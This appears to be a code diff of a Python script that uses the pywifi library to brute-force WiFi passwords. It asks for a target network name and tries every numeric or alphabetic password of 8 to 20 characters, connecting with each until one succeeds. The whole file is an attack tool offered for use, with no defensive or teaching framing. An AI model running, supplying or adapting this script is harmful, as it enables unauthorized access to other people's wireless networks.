@@ -1,111 +1,118 @@
 import itertools
 
-import random
-
 import pywifi
 
 from pywifi import const
 
-# initialize wifi interface
+def wifi_connect(wifi_name, password):
 
-wifi = pywifi.PyWiFi()
+    wifi = pywifi.PyWiFi()
 
-iface = wifi.interfaces()[0]
+    ifaces = wifi.interfaces()[0]
 
-iface.disconnect()
+    profile = pywifi.Profile()
 
-# read input
+    profile.ssid = wifi_name
 
-choice = input("My choice is: ")
+    profile.auth = const.AUTH_ALG_OPEN
 
-# define brute force functions
+    profile.akm.append(const.AKM_TYPE_WPA2PSK)
 
-def bruteforce_numbers(length):
+    profile.cipher = const.CIPHER_TYPE_CCMP
+
+    profile.key = password
+
+    ifaces.remove_all_network_profiles()
+
+    tmp_profile = ifaces.add_network_profile(profile)
+
+    ifaces.connect(tmp_profile)
+
+    if ifaces.status() == const.IFACE_CONNECTED:
+
+        return True
+
+    else:
+
+        return False
+
+def brute_force_numbers(wifi_name):
+
+    print("Starting WiFi password bruteforce with NUMBERS ONLY 8 - 20 Chars")
 
     chars = "0123456789"
 
-    for pwd in itertools.product(chars, repeat=length):
+    for length in range(8, 21):
 
-        pwd_str = "".join(pwd)
+        to_attempt = itertools.product(chars, repeat=length)
 
-        print("Trying", pwd_str)
+        for attempt in to_attempt:
 
-        profile = pywifi.Profile()
+            password = "".join(attempt)
 
-        profile.ssid = "YOUR_WIFI_SSID"
+            if wifi_connect(wifi_name, password):
 
-        profile.auth = const.AUTH_ALG_OPEN
+                print("\033[32mPassword found: {}\033[0m".format(password))
 
-        profile.akm.append(const.AKM_TYPE_NONE)
+                return True
 
-        profile.cipher = const.CIPHER_TYPE_CCMP
+            else:
 
-        profile.key = pwd_str
+                print("Trying: {}".format(password))
 
-        iface.remove_all_network_profiles()
+def brute_force_letters(wifi_name):
 
-        tmp_profile = iface.add_network_profile(profile)
-
-        iface.connect(tmp_profile)
-
-        if iface.status() == const.IFACE_CONNECTED:
-
-            print("\033[32mPassword found:", pwd_str, "\033[0m")
-
-            return
-
-def bruteforce_letters(length):
+    print("Starting WiFi password bruteforce with letters only (big and small)")
 
     chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
-    for pwd in itertools.product(chars, repeat=length):
+    for length in range(8, 21):
 
-        pwd_str = "".join(pwd)
+        to_attempt = itertools.product(chars, repeat=length)
 
-        print("Trying", pwd_str)
+        for attempt in to_attempt:
 
-        profile = pywifi.Profile()
+            password = "".join(attempt)
 
-        profile.ssid = "YOUR_WIFI_SSID"
+            if wifi_connect(wifi_name, password):
 
-        profile.auth = const.AUTH_ALG_OPEN
+                print("\033[32mPassword found: {}\033[0m".format(password))
 
-        profile.akm.append(const.AKM_TYPE_NONE)
+                return True
 
-        profile.cipher = const.CIPHER_TYPE_CCMP
+            else:
 
-        profile.key = pwd_str
+                print("Trying: {}".format(password))
 
-        iface.remove_all_network_profiles()
+if __name__ == "__main__":
 
-        tmp_profile = iface.add_network_profile(profile)
+    print("Welcome to WiFi Brute Force Script!")
 
-        iface.connect(tmp_profile)
+    wifi_name = input("Type WiFi Name for bruteforce: ")
 
-        if iface.status() == const.IFACE_CONNECTED:
+    print("Select an option:")
 
-            print("\033[32mPassword found:", pwd_str, "\033[0m")
+    print("1. Start WiFi password bruteforce with NUMBERS ONLY 8 - 20 Chars.")
 
-            return
+    print("2. Start WiFi password bruteforce with letters only (big and small).")
 
-# run chosen brute force function
+    choice = input("My choice is: ")
 
-if choice == "1":
+    if choice == "1":
 
-    length = random.randint(8, 20)
+        brute_force_numbers(wifi_name)
 
-    print("Starting WiFi password bruteforce with NUMBERS ONLY", length, "Chars")
+    elif choice == "2":
 
-    bruteforce_numbers(length)
+        brute_force_letters(wifi_name)
 
-elif choice == "2":
+    else:
 
-    length = random.randint(8, 20)
+        print("Invalid choice. Exiting...")
 
-    print("Starting WiFi password bruteforce with letters only (big and small)", length, "Chars")
 
-    bruteforce_letters(length)
+    
 
-else:
 
-    print("Invalid choice")
+
+    
